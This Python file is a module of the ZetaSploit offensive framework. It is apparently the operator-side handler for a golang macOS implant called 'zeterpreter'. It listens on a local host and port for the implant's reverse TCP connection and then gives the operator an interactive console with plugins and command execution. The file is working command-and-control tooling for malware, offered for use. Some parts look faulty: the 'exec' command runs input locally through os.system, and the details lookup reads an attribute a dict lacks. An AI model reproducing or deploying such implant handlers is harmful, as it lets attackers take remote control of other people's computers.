#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import os
import sys
import socket
import threading

from core.badges import badges
from core.helper import helper
from core.loader import loader
from core.plugin.plugin import plugin

from data.macos.reverse_tcp.zeterpreter.core.listener import listener

class ZetaSploitModule:
    def __init__(self):
        self.badges = badges()
        self.helper = helper()
        self.listener = listener()
        self.plugin = plugin()
        self.loader = loader()
        
        self.details = {
            'Name':        "macos/reverse_tcp/zeterpreter",
            'Authors':     ['enty8080'],
            'Description': "macOS implant written in golang and compiled for macOS.",
            'Comment':     "First macOS implant in history written in golang! Yay!"
        }
        
        self.options = {
            'LHOST': {
                'Description': 'Local host.',
                'Value':       self.helper.getip(),
                'Required':    True
            },
            'LPORT': {
                'Description': 'Local port',
                'Value':       self.helper.lport,
                'Required':    True
            },
        }

    def shell(self, controller):
        plugins = self.loader.load_plugins('zeterpreter', 'multi', controller)
        while True:
            try:
                command = input('\033[4mzeterpreter\033[0m> ').strip()
                commands = command.split()
                if commands == []:
                    continue
                else:
                    arguments = "".join(command.split(commands[0])).strip()
                if commands[0] == "exit":
                    break
                elif commands[0] == "clear":
                    os.system("clear")
                elif commands[0] == "help":
                    print("")
                    print("Core Commands")
                    print("=============")
                    print("")
                    print("    Command        Description")
                    print("    -------        -----------")
                    print("    back           Return to the previous menu.")
                    print("    clear          Clear terminal window.")
                    print("    details        Show specified plugin details.")
                    print("    exec           Execute system command.")
                    print("    exit           Exit Zeterpreter Framework.")
                    print("    help           Show available commands.")
                    print("    plugins        Show available plugins.")
                    print("")
                elif commands[0] == "exec":
                    if len(commands) < 2:
                        print("Usage: exec <command>")
                    else:
                        print(badges.I + "exec:")
                        os.system(arguments)
                        print("")
                elif commands[0] == "use":
                    if len(commands) < 2:
                        print("Usage: use <plugin>")
                    else:
                        if commands[1] in plugins.keys():
                            self.plugin.console(plugins, plugins[commands[1]], 'zeterpreter')
                        else:
                            print(self.badges.E + "Unrecognozed plugin!")
                elif commands[0] == "details":
                    if len(commands) < 2:
                        print("Usage: details <modules>")
                    else:
                        if commands[1] in plugins.keys():
                            self.plugin.show_details(plugins.details)
                        else:
                            print(self.badges.E + "Unrecognozed plugin!")
                elif commands[0] == "plugins":
                    for name in plugins.keys():
                        print(name)
                else:
                    print(badges.E +"Unrecognized command!")
            except (KeyboardInterrupt, EOFError):
                print("")
            except Exception as e:
                print(self.badges.E +"An error occurred: "+str(e)+"!")
            
    def run(self):
        local_host = self.options['LHOST']['Value']
        local_port = self.options['LPORT']['Value']

        controller = self.listener.listen(local_host, local_port)
        self.shell(controller)
